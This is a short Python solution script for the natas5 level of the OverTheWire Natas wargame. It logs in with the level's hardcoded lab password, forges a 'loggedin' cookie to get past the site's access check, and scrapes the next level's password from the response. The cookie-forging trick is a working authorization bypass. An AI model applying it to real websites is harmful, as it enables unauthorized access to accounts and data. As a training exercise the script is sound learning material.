#!/usr/bin/python3
import re
import requests

username = 'natas5'
password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'

url = 'http://%s.natas.labs.overthewire.org/'%(username)

auth = (username, password)

cookies = {'loggedin' : '1'}

print(url)

response = requests.get(url, auth=auth, cookies=cookies)

print(response.text)


next_password = (re.findall("natas6 is (.*)</div>",response.text))[0]

print(next_password)


